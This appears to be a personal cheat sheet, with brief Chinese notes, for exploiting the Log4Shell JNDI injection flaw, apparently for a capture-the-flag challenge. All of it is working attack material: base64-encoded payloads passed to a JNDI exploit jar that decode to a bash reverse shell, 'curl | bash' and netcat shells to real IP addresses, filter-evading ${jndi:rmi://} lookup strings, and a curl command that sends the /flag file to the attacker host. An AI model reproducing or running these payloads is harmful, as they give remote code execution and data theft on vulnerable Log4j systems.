```
bash:

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45My4yNDguMjIxLzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

```
${jndi:rmi://47.93.248.221:1099/9z9vsn}
${${::-j}ndi:${::-r}mi://47.93.248.221:1099/47g0z0}
${${lower:j}${lower:n}${lower:d}i:${lower:r}mi://47.93.248.221:1099/6oaef1}
```

```
curl

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,Y3VybCA0Ny45My4yNDguMjIxfGJhc2g=}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

```
nc

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,bmMgNDcuOTMuMjQ4LjIyMSAyMzMzIC1lIC9iaW4vc2g=}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

记得开1099和1389端口

```
calc

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,Y2FsYy5leGU=}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

```
${jndi:rmi://47.93.248.221:1099/csse3x}
```

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTAuMTI0LjIzOS8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}" -A "47.110.124.239"
```

curl访问2333

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,Y3VybCBodHRwOi8vNDcuOTMuMjQ4LjIyMToyMzMz}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl http://47.93.248.221:2333 -F file=@/flag'
```

